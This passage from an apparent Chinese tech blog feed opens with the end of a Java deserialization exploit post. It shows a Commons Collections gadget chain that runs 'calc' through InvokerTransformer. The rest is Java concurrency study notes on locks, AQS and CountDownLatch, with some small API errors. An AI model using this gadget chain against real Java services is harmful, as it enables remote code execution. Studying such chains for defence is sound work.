class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">          <span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">          HashMap&lt;Object, Object&gt; m1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">          m1.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">          Map&lt;Object,Object&gt; m2 = TransformedMap.decorate(m1, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">          Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">          <span class="type">Constructor</span> <span class="variable">cto</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">          cto.setAccessible(<span class="literal">true</span>);</span><br><span class="line">          <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cto.newInstance(Retention.class, m2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          serializable(o);</span><br><span class="line">          unSerializable();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\a.txt&quot;</span>);</span><br><span class="line">      <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">      objOut.writeObject(o);</span><br><span class="line">      System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">      file.close();</span><br><span class="line">      objOut.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerializable</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">FileInputStream</span> <span class="variable">inFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\a.txt&quot;</span>);</span><br><span class="line">      <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inFile);</span><br><span class="line">      objIn.readObject();</span><br><span class="line">      System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">      inFile.close();</span><br><span class="line">      objIn.close();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;payload&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://winkygranger.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java反序列化" scheme="https://winkygranger.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JUC(Java并发编程)</title>
    <link href="https://winkygranger.github.io/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/"/>
    <id>https://winkygranger.github.io/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/</id>
    <published>2022-05-22T13:03:41.000Z</published>
    <updated>2023-01-18T15:37:06.759Z</updated>
    
    <content type="html"><![CDATA[<p>八锁、线程池、ThreadLocal</p><span id="more"></span><h1 id="Synchronized和Lock区别"><a href="#Synchronized和Lock区别" class="headerlink" title="Synchronized和Lock区别"></a>Synchronized和Lock区别</h1><h2 id="语法层面"><a href="#语法层面" class="headerlink" title="语法层面"></a>语法层面</h2><ul><li><p>Synchronized是一个关键字，底层由C++编写 ；Lock是jdk的一个API</p></li><li><p>Synchronized退出同步代码块自动释放锁；Lock需要手动unlock()</p><h2 id="功能层面"><a href="#功能层面" class="headerlink" title="功能层面"></a>功能层面</h2></li><li><p>都是悲观锁，都互斥，都是同步锁，都可重入</p></li><li><p>Lock可获取等待状态，公平，可打断</p></li><li><p>Lock有多种实现方式</p><ul><li>ReentrantLock()</li><li>ReentrantReadWriteLock()<h2 id="特性层面"><a href="#特性层面" class="headerlink" title="特性层面"></a>特性层面</h2></li></ul></li><li><p>在没竞争或者竞争小的情况下Synchronized昨儿很多优化，偏向锁、轻量锁……</p></li><li><p>竞争激励的时候使用Lock</p></li></ul><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657350682060-97505779-b2e5-41e8-876c-75a51bafbf9e.png"><br>Condition是 JDK1.5 之后才有的，它具有很好的灵活性，比如可以实现多路通知功能也就是在一个Lock对象中可以创建多个Condition实例（即对象监视器），<strong>线程对象可以注册在指定的Condition中，从而可以有选择性的进行线程通知，在调度线程上更加灵活。 在使用notify()/notifyAll()方法进行通知时，被通知的线程是由 JVM 选择的，用ReentrantLock类结合Condition实例可以实现“选择性通知”</strong> ，这个功能非常重要，而且是 Condition 接口默认提供的。而synchronized关键字就相当于整个 Lock 对象中只有一个Condition实例，所有的线程都注册在它一个身上。如果执行notifyAll()方法的话就会通知所有处于等待状态的线程这样会造成很大的效率问题，而Condition实例的signalAll()方法 只会唤醒注册在该Condition实例中的所有等待线程。</p><h1 id="Synchronized升级"><a href="#Synchronized升级" class="headerlink" title="Synchronized升级"></a>Synchronized升级</h1><p><strong>无锁—偏向锁—轻量级锁—重量级锁</strong></p><ul><li>在实际的应用中，锁总是同一个线程持有，很少发生竞争，也就是说<strong>锁总是被第一个占用他的线程拥有，这个线程就是锁的偏向线程</strong>。</li><li>那么只需要锁在第一次被拥有的时候，记录下偏向线程的ID，这样偏向线程就一直持有锁（后续这个线程进入和退出这段同步锁的代码块时，不需要再次加锁和释放锁），而是直接会去检查锁的MARDWORD里面是否放的自己线程的ID。<ul><li>如果相等，表示偏向锁是当前线程的，就不需要再次尝试获取锁，直到竞争发生才释放锁。以后每一次同步，检查所的偏向线程ID是否与当前线程ID一致，如果一致直接进入同步，无需每次加锁解锁都去CAS更新对象头。<strong>如果自始至终使用锁的线程只有一个</strong>，很明显偏向锁几乎没有额外开销，性能极高。</li><li>如果不等，表示发生了竞争，此时锁已经不是偏向于同一个线程了，这个时候会尝试使用CAS来替换MarkWord里面的线程ID为新线程ID（偏向锁只有遇到其他线程尝试竞争偏向锁的时候，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁的）<ul><li>竞争成功，表示之前的线程不存在了，MardWord里面的线程ID为新的线程ID，锁不会升级，仍然为偏向锁；</li><li>竞争失败，这个时候可能需要升级为轻量级锁才可以保证线程间公平竞争锁</li></ul></li></ul></li><li>轻量级锁由偏向锁升级而来，当存在第二个线程竞争的时候偏向锁会升级为轻量级锁，竞争线程尝试CAS更新对象头失败，会等到<strong>全局安全点</strong>撤销偏向锁。偏向锁的撤销：<ul><li>第一个线程需要在执行synchronized方法（<strong>处于代码块</strong>），他还没有执行完，其他线程来抢夺，该偏向锁就会被取消并出现锁升级，此时轻量级锁由原持有偏向锁的线程持有，继续执行代码块，而正在竞争的线程会进入自旋获得该轻量级锁。</li><li>第一个线程执行完成synchronized（<strong>退出同步块</strong>），则将对象头设置为无锁状态并撤销偏向锁，重新偏向。</li></ul></li><li>重量级锁：基于进入退出Monitor管程对象进行的，编译时回有monitorenter和monitorexit指令<h2 id="实例方法上锁"><a href="#实例方法上锁" class="headerlink" title="实例方法上锁"></a>实例方法上锁</h2><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657350776804-3a0b319f-0e50-401e-8fa8-59cb9749ccd7.png"><h2 id="代码块上锁"><a href="#代码块上锁" class="headerlink" title="代码块上锁"></a>代码块上锁</h2><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657350826674-b8664ee2-e5ce-4126-92f4-eac312ea76aa.png"><h1 id="ReentrantLock实现3线程交替打印"><a href="#ReentrantLock实现3线程交替打印" class="headerlink" title="ReentrantLock实现3线程交替打印"></a>ReentrantLock实现3线程交替打印</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* A执行完调用B B执行完调用C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LockTicketABC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data3</span> <span class="variable">data3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data3</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">                data3.printA();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">                data3.printB();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();<span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">                data3.printC();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data3</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition1</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition2</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="type">Condition</span> <span class="variable">condition3</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printA</span><span class="params">()</span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (number != <span class="number">1</span>)&#123;</span><br><span class="line">                condition1.await();</span><br><span class="line">            &#125;</span><br><span class="line">            number = <span class="number">2</span>;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;-&gt;AAAAA&quot;</span>);</span><br><span class="line">            condition2.signal();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printB</span><span class="params">()</span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (number != <span class="number">2</span>)&#123;</span><br><span class="line">                condition2.await();</span><br><span class="line">            &#125;</span><br><span class="line">            number = <span class="number">3</span>;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;-&gt;BBBBB&quot;</span> );</span><br><span class="line">            condition3.signal();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printC</span><span class="params">()</span>&#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (number != <span class="number">3</span>)&#123;</span><br><span class="line">                condition3.await();</span><br><span class="line">            &#125;</span><br><span class="line">            number = <span class="number">1</span>;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;-&gt;CCCCC&quot;</span>);</span><br><span class="line">            condition1.signal();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h1>同步代码块例子：从头到尾锁的都是object，外层已经获取锁了，中层内层也可以直接进入。<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657350883092-a65a0508-98c4-473c-a6e2-b0db237394f7.png"></li></ul><p><strong>对于ReentrantLock:注释掉内层的unlock后：仍然可以执行完程序，但是计数器没有清零，所以拿两个线程跑的时候就会出现阻塞现象。moniterexit计数器-1，只有减到0才会释放。</strong></p><h1 id="ArrayList的并发修改异常以及解决方法"><a href="#ArrayList的并发修改异常以及解决方法" class="headerlink" title="ArrayList的并发修改异常以及解决方法"></a>ArrayList的并发修改异常以及解决方法</h1><p>并发修改异常:<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351028497-d6edc41a-b00a-48b8-98d3-dc0e1030fe1b.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">Vector</span>(); <span class="comment">//JDK1.0 古老的实现类 用的synchronized，效率低</span></span><br><span class="line">List&lt;String&gt; list = Collections.synchronizedList(<span class="keyword">new</span> <span class="title class_">ArrayList</span>()); </span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>(); <span class="comment">//用的lock锁</span></span><br></pre></td></tr></table></figure><p>SynchronizedList无需改变List类的子类的数据结构，就可以将它们转换成线程安全的类，而Vector不能。<br>SynchronizedList遍历时没有进行同步处理，Vector的遍历方法是线程安全的。<br>SynchronizedList可以指定锁定的对象，Vector的锁定范围是方法。</p><h2 id="Fail-Fast与Fail-Safe"><a href="#Fail-Fast与Fail-Safe" class="headerlink" title="Fail Fast与Fail Safe"></a>Fail Fast与Fail Safe</h2><ul><li>Fail Fast<ul><li>一旦发现遍历时有人修改就抛出异常</li><li>对于ArrayList，底层源码有两个参数：<ul><li>mpdCount ： 遍历过程中list被修改的次数</li><li>except ：遍历开始前被修改的次数</li></ul></li><li>不一致的话就报错</li></ul></li><li>Fail Save<ul><li>CopyOnWriteArrayList就是采用这种方式</li><li>读的时候遍历旧数组</li><li>插入就先copy出来，加在copy的末尾再copy回去<h1 id="HashSet安全方法"><a href="#HashSet安全方法" class="headerlink" title="HashSet安全方法"></a>HashSet安全方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;String&gt; set = Collections.synchronizedSet(<span class="keyword">new</span> <span class="title class_">HashSet</span>());</span><br><span class="line">Set&lt;String&gt; set = ConcurrentArraySet(<span class="keyword">new</span> <span class="title class_">HashSet</span>());</span><br></pre></td></tr></table></figure><h1 id="HashMap、ConcurrentHashMap、Hashtable"><a href="#HashMap、ConcurrentHashMap、Hashtable" class="headerlink" title="HashMap、ConcurrentHashMap、Hashtable"></a>HashMap、ConcurrentHashMap、Hashtable</h1><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351363266-aa96769a-754d-48e7-99e2-40dabfc7d128.png"><h1 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h1>CAS即CompareAndSwap，翻译成中文即比较并替换。Java中可以通过CAS操作来保证原子性，原子性 就是不可被中断的一些列操作或者一个操作，简单来说就是一系列操作，要么全部完成，要么失败，不 能被中断。<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351421754-c41e1ce0-e195-45e5-9ba7-9032eb660075.png"></li></ul></li></ul><h1 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h1><ul><li><p>AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 <strong>CLH 队列锁</strong>实现的，即将暂时获取不到锁的线程加入到队列中。</p></li><li><p>CLH(Craig,Landin,and Hagersten)队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">       <span class="comment">/** Marker to indicate a node is waiting in shared mode */</span></span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">SHARED</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">       <span class="comment">/** 排他锁的标识 */</span></span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">EXCLUSIVE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** waitStatus value to indicate thread has cancelled */</span></span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CANCELLED</span> <span class="operator">=</span>  <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**0：默认值</span></span><br><span class="line"><span class="comment">       -1：表示线程已经准备好了，就等释放资源了</span></span><br><span class="line"><span class="comment">       -2：在等待队列中，等待condition唤醒</span></span><br><span class="line"><span class="comment">       -3：共享式同步状态获取将会无条件地传播</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SIGNAL</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CONDITION</span> <span class="operator">=</span> -<span class="number">2</span>;</span><br><span class="line">       <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PROPAGATE</span> <span class="operator">=</span> -<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** waitStatus Node对象储存表示的对象 */</span></span><br><span class="line">       <span class="keyword">volatile</span> <span class="type">int</span> waitStatus;</span><br><span class="line">       <span class="comment">/** 上一个节点 */</span></span><br><span class="line">       <span class="keyword">volatile</span> Node prev;</span><br><span class="line">       <span class="comment">/** 下一个节点 */</span></span><br><span class="line">       <span class="keyword">volatile</span> Node next;</span><br><span class="line">       <span class="comment">/** 当前Node绑定的线程 */</span></span><br><span class="line">       <span class="keyword">volatile</span> Thread thread;</span><br><span class="line"></span><br><span class="line">       Node nextWaiter;</span><br><span class="line">       <span class="comment">/** 返回前一个节点，如果为null就抛异常 */</span></span><br><span class="line">       <span class="keyword">final</span> Node <span class="title function_">predecessor</span><span class="params">()</span> <span class="keyword">throws</span> NullPointerException &#123;</span><br><span class="line">           <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> prev;</span><br><span class="line">           <span class="keyword">if</span> (p == <span class="literal">null</span>)</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351486869-560b9e7c-234d-4642-97c4-8db3937ce462.png"><br>node节点里有个变量非常重要！<strong>waitStatus</strong><br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351531904-72abf8ce-611d-4b93-816d-7d495ea52ee5.png"><br>1：线程被取消<br>0：默认值</p></li><li><p>1：表示线程已经准备好了，就等释放资源了</p></li><li><p>2：在等待队列中，等待condition唤醒</p></li><li><p>3：共享式同步状态获取将会无条件地传播</p></li><li><p>下面举例说明，以独占式的 ReentrantLock 为例， state 初始状态为0，表示未锁定状态。A线程进行 lock() 时，会调用 tryAcquire() 独占该锁并将 state+1 。此后，其他线程再调用 tryAcquire() 时 就会失败，直到A线程 unlock() 到state=0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A线程自己是可以重复获取此锁的（state会累加），这就是可重入的概念。但要注意，获取 多少次就要释放多么次，这样才能保证state是能回到零态的。</p></li></ul><p><strong>非公平锁</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//通过cas方式尝试将state从0改为1，返回true则代表修改成功</span></span><br><span class="line">     <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">         <span class="comment">//属性设置为当前线程</span></span><br><span class="line">          setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">         <span class="comment">//如下</span></span><br><span class="line">          acquire(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">acquire</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="comment">//再次尝试获取锁资源</span></span><br><span class="line">        <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            <span class="comment">//失败的话追加在队列尾部</span></span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">            selfInterrupt();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="常用的辅助类（必会）"><a href="#常用的辅助类（必会）" class="headerlink" title="常用的辅助类（必会）"></a>常用的辅助类（必会）</h1><h2 id="CountDownLatch-减法计数器"><a href="#CountDownLatch-减法计数器" class="headerlink" title="CountDownLatch 减法计数器"></a>CountDownLatch 减法计数器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                countDownLatch.countDown();<span class="comment">//数量减一</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;  Go Out&quot;</span>);</span><br><span class="line">            &#125;,String.valueOf(i)).start();</span><br><span class="line">        &#125;</span><br><span class="line">        countDownLatch.await(); <span class="comment">//这里指的是等到计数器归零以后才会往下执行操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Close the door&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="CyclicBarrier-加法计数器"><a href="#CyclicBarrier-加法计数器" class="headerlink" title="CyclicBarrier 加法计数器"></a>CyclicBarrier 加法计数器</h2><p>反应了等一组线程某个条件完成以后全部一起执行后续功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 